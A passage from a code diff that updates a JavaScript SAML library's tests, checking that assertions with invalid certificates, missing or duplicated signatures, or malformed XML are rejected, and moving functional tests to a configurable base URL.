509Certificate></X509Data></KeyInfo></Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\" SPNameQualifier=\"invalid-value\">foo</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2016-09-29T12:45:22.345Z\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2016-09-29T12:35:22.345Z\" NotOnOrAfter=\"2016-09-29T12:45:22.345Z\"><saml:AudienceRestriction><saml:Audience>urn:myapp</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AttributeStatement xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"><saml:AttributeValue xsi:type=\"xs:anyType\">foo@bar.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><saml:AttributeValue xsi:type=\"xs:anyType\">Foo Bar</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthnStatement AuthnInstant=\"2016-09-29T12:35:22.345Z\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><SignedInfo><CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/><Reference URI=\"#_muhd3ZBmN9LK3Ev08rkc8CA40YvNOkGl\"><Transforms><Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></Transforms><DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/><DigestValue>Gsh2DubHXYDeuHyBa+DU1k5G43UjyQsyPRYVgEqpTD8=</DigestValue></Reference></SignedInfo><SignatureValue>mubsqLCaM16gT2rAFLl8XDuLWTALH6cdRMM/kNHLpVzO5PA6FGVPX5ojW2UCKGOhGHn0Hd/mYCOCtgAROphWjxpQl5TDyeQE0frjKs8ik0V/Jjy5T6PeWKHLqN6sHbP6YpkGixshCWtop8JOs6SijM9PBGnWal6Nx5bUMBfAyUnGyIhLwNaE8Z4NHkyAqmdxgLS0e8w5qngKQaUlyERZCrqKQ4w8VaHFG4Dos36XVfh+U7udo3IlbrpBLsu9xG1Azxe2iPC6+84xC09P6EvQylvTnz5NU4jhk10SmmRjZ6AVvzJTz/gbVfRfZoEAUhCuIIh3HuRwf400ESf38ouZTA==</SignatureValue><KeyInfo><X509Data><X509Certificate>MIIEDzCCAvegAwIBAgIJALr9HwgrQ7GeMA0GCSqGSIb3DQEBBQUAMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDAeFw0xMjEyMjkxNTMwNDdaFw0xMzAxMjgxNTMwNDdaMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMZiVmNHiXLldrgbS50ONNOH7pJ2zg6OcSMkYZGDZJbOZ/TqwauC6JOnI7+xtkPJsQHZSFJs4U0srjZKzDCmaz2jLAJDShP2jaXlrki16nDLPE//IGAg3BJguSmBCWpDbSm92V9hSsE+Mhx6bDaJiw8yQ+Q8iSm0aTQZtp6O4ICMu00ESdh9NJqIECELvP31ADV1Xhj7IbyyVPDFxMv3ol5BySE9wwwOFUq/wv7Xz9LRiUjUzPO+Lq3OM3o/uCDbk7jD7XrGUuOydALD8ULsXp4EuDO+nFbeXB/iKndZynuVKokirywl2nD2IP0/yncdLQZ8ByIyqP3G82fq/l8p7AsCAwEAAaOBxzCBxDAdBgNVHQ4EFgQUHI2rUXeBjTv1zAllaPGrHFcEK0YwgZQGA1UdIwSBjDCBiYAUHI2rUXeBjTv1zAllaPGrHFcEK0ahZqRkMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZIIJALr9HwgrQ7GeMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAFrXIhCy4T4eGrikb0R2wHv/uS548r3pZyBV0CDbcRwAtbnpJMvkGFqKVp4pmyoIDSVNK/j+sLEshB20XftezHZyRJbCUbtKvXQ6FsxoeZMlN0ITYKTaoBZKhUxxj90otAhNC58qwGUPqt2LewJhHyLucKkGJ1mQ3b5xKZ532ToufouH9VLhig3H1KnxWo/zMD6Ke8cCk6qO9htuhI06s3GQGS1QWQtAmm17C6TfKgDwQFZwhqHUUZnwKRH8gU6OgZsvhgV1B7H5mjZcu57KMiDBekU9MEY0DCVTN3WkmcTII668zLsJrkNX6PEfck1AMBbVE6pEUKcWwq3uaLvlAUo=</X509Certificate></X509Data></KeyInfo></Signature></saml:Assertion>';\n-\n-      const publicKey = fs\n-        .readFileSync(__dirname + \"/test-auth0.cer\")\n-        .toString();\n-      const samlPassport = new SamlPassport({\n-        cert: publicKey,\n-        realm: \"urn:myapp\",\n-        checkRecipient: false,\n-      });\n-      samlPassport.validateSamlAssertion(assertion, function (err, profile) {\n-        assert.ok(err);\n-        assert.ok(!profile);\n-        assert.equal(\n-          err.message,\n-          \"Signature was found more than one time (xpath: /*[local-name(.)='Assertion']/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#'])\"\n+    it(\"should fail when the X509Certificate is invalid\", function (done) {\n+        const signedAssertion = fs\n+            .readFileSync(\n+                __dirname + \"/samples/plain/samlresponse_saml20_invalid_cert.txt\"\n+            )\n+            .toString();\n+        const options = {\n+            checkDestination: false,\n+            thumbprint: \"B2AC2C07C63A1846C32DEAE2DE83B0640B24A0FF\",\n+        };\n+\n+        const samlPassport = new SamlPassport(options);\n+        samlPassport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (err, profile) {\n+                expect(err).to.exist;\n+                const errorMessages = [\n+                    \"The signing certificate is invalid (PEM_read_bio_PUBKEY failed)\",\n+                    \"The signing certificate is invalid (error:0906700D:PEM routines:PEM_ASN1_read_bio:ASN1 lib, error:0D07803A:asn1 encoding routines:ASN1_ITEM_EX_D2I:nested asn1 error, error:0D068066:asn1 encoding routines:ASN1_CHECK_TLEN:bad object header)\",\n+                    \"The signing certificate is invalid (error:0D07803A:asn1 encoding routines:asn1_item_embed_d2i:nested asn1 error, error:0D068066:asn1 encoding routines:asn1_check_tlen:bad object header)\",\n+                    \"The signing certificate is invalid (error:0688010A:asn1 encoding routines::nested asn1 error, error:06800066:asn1 encoding routines::bad object header)\",\n+                    // This is required for Node version 22\n+                    \"The signing certificate is invalid (error:1E08010C:DECODER routines::unsupported, error:0688010A:asn1 encoding routines::nested asn1 error, error:06800066:asn1 encoding routines::bad object header, error:0680009B:asn1 encoding routines::too long)\",\n+                ];\n+\n+                assert.ok(err, \"The signing certificate was unexpectedly valid\");\n+                assert.ok(\n+                    errorMessages.includes(err.message),\n+                    \"Error message for invalid certificate is incorrect\"\n+                );\n+                done();\n+            }\n         );\n-        done();\n-      });\n     });\n-  });\n-});\n+\n+    describe(\"validate saml assertion (signature checks)\", function () {\n+        it(\"should fail when signature is not found\", function (done) {\n+            const assertion =\n+                '<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" Version=\"2.0\" ID=\"_muhd3ZBmN9LK3Ev08rkc8CA40YvNOkGl\" IssueInstant=\"2016-09-29T12:35:22.345Z\"><saml:Issuer>urn:issuer</saml:Issuer><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\" SPNameQualifier=\"invalid-value\">foo</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2016-09-29T12:45:22.345Z\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2016-09-29T12:35:22.345Z\" NotOnOrAfter=\"2016-09-29T12:45:22.345Z\"><saml:AudienceRestriction><saml:Audience>urn:myapp</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AttributeStatement xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"><saml:AttributeValue xsi:type=\"xs:anyType\">foo@bar.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><saml:AttributeValue xsi:type=\"xs:anyType\">Foo Bar</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthnStatement AuthnInstant=\"2016-09-29T12:35:22.345Z\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement></saml:Assertion>';\n+\n+            const publicKey = fs\n+                .readFileSync(__dirname + \"/test-auth0.cer\")\n+                .toString();\n+            const samlPassport = new SamlPassport({\n+                cert: publicKey,\n+                realm: \"urn:myapp\",\n+                checkRecipient: false,\n+            });\n+            samlPassport.validateSamlAssertion(assertion, {}, function (err, profile) {\n+                assert.ok(err);\n+                assert.ok(!profile);\n+                assert.equal(\n+                    err.message,\n+                    \"Signature is missing (xpath: //*[local-name(.)='Assertion'][1]/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#'])\"\n+                );\n+                done();\n+            });\n+        });\n+\n+        it(\"should fail when signature is found twice\", function (done) {\n+            const assertion =\n+                '<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" Version=\"2.0\" ID=\"_muhd3ZBmN9LK3Ev08rkc8CA40YvNOkGl\" IssueInstant=\"2016-09-29T12:35:22.345Z\"><saml:Issuer>urn:issuer</saml:Issuer><Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><SignedInfo><CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/><Reference URI=\"#_muhd3ZBmN9LK3Ev08rkc8CA40YvNOkGl\"><Transforms><Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></Transforms><DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/><DigestValue>Gsh2DubHXYDeuHyBa+DU1k5G43UjyQsyPRYVgEqpTD8=</DigestValue></Reference></SignedInfo><SignatureValue>mubsqLCaM16gT2rAFLl8XDuLWTALH6cdRMM/kNHLpVzO5PA6FGVPX5ojW2UCKGOhGHn0Hd/mYCOCtgAROphWjxpQl5TDyeQE0frjKs8ik0V/Jjy5T6PeWKHLqN6sHbP6YpkGixshCWtop8JOs6SijM9PBGnWal6Nx5bUMBfAyUnGyIhLwNaE8Z4NHkyAqmdxgLS0e8w5qngKQaUlyERZCrqKQ4w8VaHFG4Dos36XVfh+U7udo3IlbrpBLsu9xG1Azxe2iPC6+84xC09P6EvQylvTnz5NU4jhk10SmmRjZ6AVvzJTz/gbVfRfZoEAUhCuIIh3HuRwf400ESf38ouZTA==</SignatureValue><KeyInfo><X509Data><X509Certificate>MIIEDzCCAvegAwIBAgIJALr9HwgrQ7GeMA0GCSqGSIb3DQEBBQUAMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDAeFw0xMjEyMjkxNTMwNDdaFw0xMzAxMjgxNTMwNDdaMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMZiVmNHiXLldrgbS50ONNOH7pJ2zg6OcSMkYZGDZJbOZ/TqwauC6JOnI7+xtkPJsQHZSFJs4U0srjZKzDCmaz2jLAJDShP2jaXlrki16nDLPE//IGAg3BJguSmBCWpDbSm92V9hSsE+Mhx6bDaJiw8yQ+Q8iSm0aTQZtp6O4ICMu00ESdh9NJqIECELvP31ADV1Xhj7IbyyVPDFxMv3ol5BySE9wwwOFUq/wv7Xz9LRiUjUzPO+Lq3OM3o/uCDbk7jD7XrGUuOydALD8ULsXp4EuDO+nFbeXB/iKndZynuVKokirywl2nD2IP0/yncdLQZ8ByIyqP3G82fq/l8p7AsCAwEAAaOBxzCBxDAdBgNVHQ4EFgQUHI2rUXeBjTv1zAllaPGrHFcEK0YwgZQGA1UdIwSBjDCBiYAUHI2rUXeBjTv1zAllaPGrHFcEK0ahZqRkMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZIIJALr9HwgrQ7GeMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAFrXIhCy4T4eGrikb0R2wHv/uS548r3pZyBV0CDbcRwAtbnpJMvkGFqKVp4pmyoIDSVNK/j+sLEshB20XftezHZyRJbCUbtKvXQ6FsxoeZMlN0ITYKTaoBZKhUxxj90otAhNC58qwGUPqt2LewJhHyLucKkGJ1mQ3b5xKZ532ToufouH9VLhig3H1KnxWo/zMD6Ke8cCk6qO9htuhI06s3GQGS1QWQtAmm17C6TfKgDwQFZwhqHUUZnwKRH8gU6OgZsvhgV1B7H5mjZcu57KMiDBekU9MEY0DCVTN3WkmcTII668zLsJrkNX6PEfck1AMBbVE6pEUKcWwq3uaLvlAUo=</X509Certificate></X509Data></KeyInfo></Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\" SPNameQualifier=\"invalid-value\">foo</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2016-09-29T12:45:22.345Z\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2016-09-29T12:35:22.345Z\" NotOnOrAfter=\"2016-09-29T12:45:22.345Z\"><saml:AudienceRestriction><saml:Audience>urn:myapp</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AttributeStatement xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"><saml:AttributeValue xsi:type=\"xs:anyType\">foo@bar.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><saml:AttributeValue xsi:type=\"xs:anyType\">Foo Bar</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthnStatement AuthnInstant=\"2016-09-29T12:35:22.345Z\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement><Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><SignedInfo><CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/><Reference URI=\"#_muhd3ZBmN9LK3Ev08rkc8CA40YvNOkGl\"><Transforms><Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></Transforms><DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/><DigestValue>Gsh2DubHXYDeuHyBa+DU1k5G43UjyQsyPRYVgEqpTD8=</DigestValue></Reference></SignedInfo><SignatureValue>mubsqLCaM16gT2rAFLl8XDuLWTALH6cdRMM/kNHLpVzO5PA6FGVPX5ojW2UCKGOhGHn0Hd/mYCOCtgAROphWjxpQl5TDyeQE0frjKs8ik0V/Jjy5T6PeWKHLqN6sHbP6YpkGixshCWtop8JOs6SijM9PBGnWal6Nx5bUMBfAyUnGyIhLwNaE8Z4NHkyAqmdxgLS0e8w5qngKQaUlyERZCrqKQ4w8VaHFG4Dos36XVfh+U7udo3IlbrpBLsu9xG1Azxe2iPC6+84xC09P6EvQylvTnz5NU4jhk10SmmRjZ6AVvzJTz/gbVfRfZoEAUhCuIIh3HuRwf400ESf38ouZTA==</SignatureValue><KeyInfo><X509Data><X509Certificate>MIIEDzCCAvegAwIBAgIJALr9HwgrQ7GeMA0GCSqGSIb3DQEBBQUAMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDAeFw0xMjEyMjkxNTMwNDdaFw0xMzAxMjgxNTMwNDdaMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMZiVmNHiXLldrgbS50ONNOH7pJ2zg6OcSMkYZGDZJbOZ/TqwauC6JOnI7+xtkPJsQHZSFJs4U0srjZKzDCmaz2jLAJDShP2jaXlrki16nDLPE//IGAg3BJguSmBCWpDbSm92V9hSsE+Mhx6bDaJiw8yQ+Q8iSm0aTQZtp6O4ICMu00ESdh9NJqIECELvP31ADV1Xhj7IbyyVPDFxMv3ol5BySE9wwwOFUq/wv7Xz9LRiUjUzPO+Lq3OM3o/uCDbk7jD7XrGUuOydALD8ULsXp4EuDO+nFbeXB/iKndZynuVKokirywl2nD2IP0/yncdLQZ8ByIyqP3G82fq/l8p7AsCAwEAAaOBxzCBxDAdBgNVHQ4EFgQUHI2rUXeBjTv1zAllaPGrHFcEK0YwgZQGA1UdIwSBjDCBiYAUHI2rUXeBjTv1zAllaPGrHFcEK0ahZqRkMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZIIJALr9HwgrQ7GeMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAFrXIhCy4T4eGrikb0R2wHv/uS548r3pZyBV0CDbcRwAtbnpJMvkGFqKVp4pmyoIDSVNK/j+sLEshB20XftezHZyRJbCUbtKvXQ6FsxoeZMlN0ITYKTaoBZKhUxxj90otAhNC58qwGUPqt2LewJhHyLucKkGJ1mQ3b5xKZ532ToufouH9VLhig3H1KnxWo/zMD6Ke8cCk6qO9htuhI06s3GQGS1QWQtAmm17C6TfKgDwQFZwhqHUUZnwKRH8gU6OgZsvhgV1B7H5mjZcu57KMiDBekU9MEY0DCVTN3WkmcTII668zLsJrkNX6PEfck1AMBbVE6pEUKcWwq3uaLvlAUo=</X509Certificate></X509Data></KeyInfo></Signature></saml:Assertion>';\n+\n+            const publicKey = fs\n+                .readFileSync(__dirname + \"/test-auth0.cer\")\n+                .toString();\n+            const samlPassport = new SamlPassport({\n+                cert: publicKey,\n+                realm: \"urn:myapp\",\n+                checkRecipient: false,\n+            });\n+            samlPassport.validateSamlAssertion(assertion, {}, function (err, profile) {\n+                assert.ok(err);\n+                assert.ok(!profile);\n+                assert.equal(\n+                    err.message,\n+                    \"Signature was found more than one time (xpath: //*[local-name(.)='Assertion'][1]/*[local-name(.)='Signature' and namespace-uri(.)='http://www.w3.org/2000/09/xmldsig#'])\"\n+                );\n+                done();\n+            });\n+        });\n+    });\n+\n+    describe(\"invalid xml\", () => {\n+        it('validateSamlAssertion should handle invalid XML - \"<doc><![CDATA[</doc>\"', (done) => {\n+            const publicKey = fs\n+                .readFileSync(__dirname + \"/test-auth0.cer\")\n+                .toString();\n+            const samlPassport = new SamlPassport({\n+                cert: publicKey,\n+                realm: \"urn:myapp\",\n+                checkRecipient: false,\n+            });\n+            try {\n+                samlPassport.validateSamlAssertion(\n+                    \"<doc><![CDATA[</doc>\", {},\n+                    function (err, _profile) {\n+                        done(new Error(\"callback not expected\"));\n+                    }\n+                );\n+            } catch (err) {\n+                // yes this is bunk, to keep backwards compatibility, exceptions are thrown\n+                // up the stack.\n+                expect(err.message).to.equal(\"SAMLResponse should be a valid xml\");\n+                done();\n+            }\n+        });\n+\n+        it('validateSignature should handle invalid XML - \"<doc><![CDATA[</doc>\"', (done) => {\n+            const publicKey = fs\n+                .readFileSync(__dirname + \"/test-auth0.cer\")\n+                .toString();\n+            const samlPassport = new SamlPassport({\n+                cert: publicKey,\n+                realm: \"urn:myapp\",\n+                checkRecipient: false,\n+            });\n+            try {\n+                samlPassport.validateSignature(\n+                    \"<doc><![CDATA[</doc>\",\n+                    {},\n+                    function (err, _profile) {\n+                        done(new Error(\"callback not expected\"));\n+                    }\n+                );\n+            } catch (err) {\n+                // yes this is bunk, to keep backwards compatibility, exceptions are thrown\n+                // up the stack.\n+                expect(err.message).to.equal(\"SAMLResponse should be a valid xml\");\n+                done();\n+            }\n+        });\n+    });\n+});\n\\ No newline at end of file\n```\n\nFilename: test/samlp.functional.tests.js:\n```\n@@ -2,7 +2,7 @@\nvar expect  = require('chai').expect;\n var request = require('request');\n var qs      = require('querystring');\n var cheerio = require('cheerio');\n-var xmldom  = require('@auth0/xmldom');\n+var xmldom  = require('@xmldom/xmldom');\n var fs      = require('fs');\n var path    = require('path');\n var zlib    = require('zlib');\n\n@@ -28,19 +28,19 @@\ndescribe('samlp (functional tests)', function () {\n \n     before(function (done) {\n       // this samlp request comes from Salesforce\n-      doSamlpFlow(`http://localhost:5051/samlp?SAMLRequest=${samlRequest}&RelayState=123`,\n-                  'http://localhost:5051/callback', function(err, resp) {\n-        if (err) return done(err);\n-        if (resp.response.statusCode !== 200) return done(new Error(resp.body));\n-        r = resp.response;\n-        bod = resp.body;\n-        done();\n-      });\n+      doSamlpFlow(`${server.BASE_URL}/samlp?SAMLRequest=${samlRequest}&RelayState=123`,\n+          `${server.BASE_URL}/callback`, function(err, resp) {\n+            if (err) return done(err);\n+            if (resp.response.statusCode !== 200) return done(new Error(resp.body));\n+            r = resp.response;\n+            bod = resp.body;\n+            done();\n+          });\n     });\n \n     it('should be valid signature', function(){\n       expect(r.statusCode)\n-            .to.equal(200);\n+          .to.equal(200);\n     });\n \n     it('should return a valid user', function(){\n\n@@ -57,18 +57,18 @@\ndescribe('samlp (functional tests)', function () {\n \n     before(function (done) {\n       server.options = { signResponse: true };\n-      doSamlpFlow(`http://localhost:5051/samlp?SAMLRequest=${samlRequest}&RelayState=123`,\n-            'http://localhost:5051/callback/samlp-invalidcert', function(err, resp) {\n-        if (err) return done(err);\n-        r = resp.response;\n-        bod = resp.body;\n-        done();\n-      });\n+      doSamlpFlow(`${server.BASE_URL}/samlp?SAMLRequest=${samlRequest}&RelayState=123`,\n+          `${server.BASE_URL}/callback/samlp-invalidcert`, function(err, resp) {\n+            if (err) return done(err);\n+            r = resp.response;\n+            bod = resp.body;\n+            done();\n+          });\n     });\n \n     it('should return 400 (invalid signature)', function(){\n       expect(r.statusCode)\n-            .to.equal(400);\n+          .to.equal(400);\n     });\n   });\n\n@@ -77,19 +77,19 @@\ndescribe('samlp (functional tests)', function () {\n \n     before(function (done) {\n       server.options = { signResponse: true };\n-      doSamlpFlow(`http://localhost:5051/samlp?SAMLRequest=${samlRequest}&RelayState=123`,\n-            'http://localhost:5051/callback/samlp-signedresponse', function(err, resp) {\n-        if (err) return done(err);\n-        if (resp.response.statusCode !== 200) return done(new Error(resp.body));\n-        r = resp.response;\n-        bod = resp.body;\n-        done();\n-      });\n+      doSamlpFlow(`${server.BASE_URL}/samlp?SAMLRequest=${samlRequest}&RelayState=123`,\n+          `${server.BASE_URL}/callback/samlp-signedresponse`, function(err, resp) {\n+            if (err) return done(err);\n+            if (resp.response.statusCode !== 200) return done(new Error(resp.body));\n+            r = resp.response;\n+            bod = resp.body;\n+            done();\n+          });\n     });\n \n     it('should be valid signature', function(){\n       expect(r.statusCode)\n-            .to.equal(200);\n+          .to.equal(200);\n     });\n \n     it('should return a valid user', function(){\n\n@@ -107,18 +107,18 @@\ndescribe('samlp (functional tests)', function () {\n \n     before(function (done) {\n       server.options = { signResponse: true };\n-      doSamlpFlow(`http://localhost:5051/samlp?SAMLRequest=${samlRequest}&RelayState=123`,\n-            'http://localhost:5051/callback/samlp-signedresponse-invalidcert', function(err, resp) {\n-        if (err) return done(err);\n-        r = resp.response;\n-        bod = resp.body;\n-        done();\n-      });\n+      doSamlpFlow(`${server.BASE_URL}/samlp?SAMLRequest=${samlRequest}&RelayState=123`,\n+          `${server.BASE_URL}/callback/samlp-signedresponse-invalidcert`, function(err, resp) {\n+            if (err) return done(err);\n+            r = resp.response;\n+            bod = resp.body;\n+            done();\n+          });\n     });\n \n     it('should return 400 (invalid signature)', function(){\n       expect(r.statusCode)\n-            .to.equal(400);\n+          .to.equal(400);\n     });\n   });\n\n@@ -128,7 +128,7 @@\ndescribe('samlp (functional tests)', function () {\n     before(function (done) {\n       request.post({\n         jar: request.jar(),\n-        uri: 'http://localhost:5051/callback'\n+        uri: `${server.BASE_URL}/callback`\n       }, function(err, response, body) {\n         if(err) return done(err);\n         r = response;\n\n@@ -139,9 +139,9 @@\ndescribe('samlp (functional tests)', function () {\n \n     it('should redirect to idp', function(){\n       expect(r.statusCode)\n-            .to.equal(302);\n+          .to.equal(302);\n       expect(r.headers.location.split('?')[0])\n-            .to.equal('http://localhost:5051/samlp');\n+          .to.equal(`${server.BASE_URL}/samlp`);\n       var querystring = qs.parse(r.headers.location.split('?')[1]);\n       expect(querystring).to.have.property('SAMLRequest');\n       expect(querystring).to.have.property('RelayState');\n\n@@ -154,7 +154,7 @@\ndescribe('samlp (functional tests)', function () {\n     before(function (done) {\n       request.post({\n         jar: request.jar(),\n-        uri: 'http://localhost:5051/callback/samlp-with-invalid-xml',\n+        uri: `${server.BASE_URL}/callback/samlp-with-invalid-xml`,\n         form: { SAMLResponse: 'PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0iVVRGLTgiPz48c2FtbDJwOlJlc3BvbnNlIHhtbG5zOnNhbWwycD0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnByb3RvY29sIiBEZXN0aW5hdGlvbj0iaHR0cHM6Ly9mbWktdGVzdC5hdXRoMC5jb20vbG9naW4vY2FsbGJhY2siIElEPSJfNzY4NjU5OGUzNDk4YjcxOGM3MjcyNmZlMjVhZDU3Y2MiIEluUmVzcG9uc2VUbz0iXzM3ZjAyNjJkYWZlNmJhZWFmYThiIiBJc3N1ZUluc3RhbnQ9IjIwMTQtMDQtMTFUMTE6MzU6MjQuMDYwWiIgVmVyc2lvbj0iMi4wIj48c2FtbDI6SXNzdWVyIHhtbG5zOnNhbWwyPSJ1cm46b2FzaXM6bmFtZXM6dGM6U0FNTDoyLjA6YXNzZXJ0aW9uIiBGb3JtYXQ9InVybjpvYXNpczpuYW1lczp0YzpTQU1MOjIuMDpuYW1laWQtZm9ybWF0OmVudGl0eSI+aHR0cHM6Ly9hYWktbG9nb24uZXRoei5jaC9pZHAvc2hpYmJvbGV0aDwvc2FtbDI6SXNzdWVyPjxzYW1sMnA6U3RhdHVzPjxzYW1sMnA6U3RhdHVzQ29kZSBWYWx1ZT0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOnN0YXR1czpTdWNjZXNzIi8+PHNhbWwycDpTdGF0dXM+PHNhbWwyOkVuY3J5cHRlZEFzc2VydGlvbiB4bWxuczpzYW1sMj0idXJuOm9hc2lzOm5hbWVzOnRjOlNBTUw6Mi4wOmFzc2VydGlvbiIgLz48eGVuYzpFbmNyeXB0ZWREYXRhIHhtbG5zOnhlbmM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMDQveG1sZW5jIyIgSWQ9Il9jOGY1Y2QyZTAwY2UyMzkwYTJkMjdlMzRjZjQwZWI2YSIgVHlwZT0iaHR0cDovL3d3dy53My5vcmcvMjAwMS8wNC94bWxlbmMjRWxlbWVudCI+PHhlbmM6RW5jcnlwdGlvbk1ldGhvZCBBbGdvcml0aG09Imh0dHA6Ly93d3cudzMub3JnLzIwMDEvMDQveG1